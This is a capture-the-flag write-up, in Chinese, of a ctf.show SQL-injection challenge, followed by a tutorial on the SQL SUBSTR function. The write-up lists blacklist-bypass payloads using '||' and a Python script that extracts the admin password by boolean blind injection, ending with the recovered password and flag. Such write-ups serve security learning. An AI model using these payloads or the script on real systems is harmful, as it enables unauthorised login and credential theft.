打开网站，都是图片没有可靠信息，于是yakit扫描目录
得到/admin 
手工测试发现
> ①用户名/密码错误：当输入的用户名不为admin且不超过限制的长度时 
   ②用户名错误：用户名长度超过限制(字符长度最大为20) 
   ③密码错误：输入用户名为admin

分别有四种回显：`我报警了`，`用户···········错误`,`用户名/密码错误`,`原生SQL报错`

第一种明显就是直接黑名单了，`or,select,limit,order by,concat,group_concat,database,....`都被过滤掉了

还剩下，`updataxml,||,as,',(),`
虽然过滤了很多字符，但是没有过滤关键的’,所以，我们还是可以注入滴。union被过滤了但是有报错回显，这里我们可以bool盲注。虽然这里and，or都过滤了，我们可以使用||来代替or来实现一个bool的盲注。

为假的payload：`u=admin123'||'5'<'2&p=123456`
![[0035萌新记忆01.png]]

为真的payload：`u=admin123'||'1'<'2&p=123456`
![[0035萌新记忆02.png]]

测试：`u='||length(p)<'17&p=123456` 返回`用户名/密码错误`
`u='||length(p)<'18&p=123456` 返回 `密码错误`
所以推测出 p的密码长度为17


```python
import requests

headers = {
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://bf6c9121-c5b6-4b69-a85b-cfd0f111e7b6.challenge.ctf.show/admin/',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Origin': 'http://bf6c9121-c5b6-4b69-a85b-cfd0f111e7b6.challenge.ctf.show',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
}

def pd_onece(data="u='||substr(p,1,1)<'d&p=123456"):

	response = requests.post(
	    'http://477282c1-586a-432e-9464-e63273bd4551.challenge.ctf.show/admin/checklogin.php',
	    headers=headers,
	    data=data,
	)
	text = response.text
	if text =='密码错误':
		# 当前判断 SQL为真
		return True
	else:
		return False 

def one_test_pass(start=97,end=123,i=1):
	for ord_j in range(start,end):
		# A-Z 65-90
		# [\]^_`  91-96
		# a-z 97-122
		
		data = f"u='||substr(p,{i},1)<'{chr(ord_j)}&p=123456"
		print(data)
		# data = f"u='||substr(p,1,1)<'d&p=123456"
		pd = pd_onece(data)
		if pd:
		
			return chr(ord_j-1)

def start_pass_sql():

	result = ''
	for i in range(1,18):
		pd = one_test_pass(i=i)
		if pd:
			result += pd
			print(f'admin密码是：{result}')
			continue
	
start_pass_sql()
		
```
破解得到 admin密码为 `cptbtptpbcptdtptp`
登陆后得到 `ctfshow{72aba743-1207-4078-abd0-153aaf25be40}`



----

# SQL中SUBSTR函数的用法

SUBSTR函数（在某些数据库中也称为SUBSTRING）是SQL中用于从字符串中提取子字符串的函数。下面详细介绍其用法：

## 基本语法

不同数据库系统中，SUBSTR函数的语法略有差异：

### 1. Oracle/MySQL/MariaDB/Presto
```sql
SUBSTR(string, start_position, [length])
```

### 2. SQL Server/PostgreSQL
```sql
SUBSTRING(string, start_position, length)
```

## 参数说明

- **string**: 要提取子字符串的源字符串
- **start_position**: 开始提取的位置（注意不同数据库起始位置可能不同）
- **length**: (可选) 要提取的字符数（Oracle中可选，SQL Server中必需）

## 重要差异

1. **起始位置编号差异**：
   - Oracle：起始位置可以为1（从第一个字符开始）或负数（从字符串末尾向前计数）
   - SQL Server：起始位置必须为正数（从第一个字符开始）
   - MySQL/MariaDB：支持正负数起始位置

2. **length参数差异**：
   - Oracle：如果省略length参数，则提取从start_position到字符串末尾的所有字符
   - SQL Server：length参数是必需的

## 示例用法

### Oracle/MariaDB/MySQL示例

```sql
-- 从第5个字符开始提取，提取3个字符
SELECT SUBSTR('Hello World', 5, 3) FROM dual;  -- 结果: 'o W'

-- 从第7个字符开始提取到末尾
SELECT SUBSTR('Hello World', 7) FROM dual;  -- 结果: 'World'

-- 使用负数起始位置（从末尾向前数）
SELECT SUBSTR('Hello World', -5, 3) FROM dual;  -- 结果: 'Wor'
```

### SQL Server示例

```sql
-- 从第5个字符开始提取，提取3个字符
SELECT SUBSTRING('Hello World', 5, 3);  -- 结果: 'o W'

-- 从第7个字符开始提取到末尾（需要计算总长度）
SELECT SUBSTRING('Hello World', 7, LEN('Hello World') - 6);  -- 结果: 'World'
```

## 实际应用场景

1. **数据格式化**：
   ```sql
   -- 从邮箱提取用户名（@符号前的部分）
   SELECT SUBSTR(email, 1, INSTR(email, '@') - 1) AS username FROM users;
   ```

2. **数据验证**：
   ```sql
   -- 检查电话号码是否以特定前缀开头
   SELECT * FROM contacts WHERE SUBSTR(phone_number, 1, 3) = '139';
   ```

3. **字符串处理**：
   ```sql
   -- 隐藏部分敏感信息（如身份证号）
   SELECT SUBSTR(id_card, 1, 6) || '********' || SUBSTR(id_card, -4) AS masked_id
   FROM users;
   ```

4. **子字符串搜索**：
   ```sql
   -- 与INSTR函数结合查找特定位置的字符
   SELECT * FROM products
   WHERE INSTR(product_code, 'A') > 0
   AND SUBSTR(product_code, INSTR(product_code, 'A'), 3) = 'ABC';
   ```

## 注意事项

1. **性能考虑**：对大型数据集使用SUBSTR函数可能会影响性能，尤其是在WHERE子句中
2. **索引利用**：如果在SUBSTR上使用WHERE条件，通常无法利用常规索引（可以考虑函数索引）
3. **NULL处理**：如果源字符串为NULL，SUBSTR函数将返回NULL
4. **UTF-8字符**：在处理多字节字符集时，注意SUBSTR通常按字节而非字符计数（某些数据库提供专门的字符级函数）

通过合理使用SUBSTR函数，可以有效地处理和操作字符串数据，实现各种数据提取和转换需求。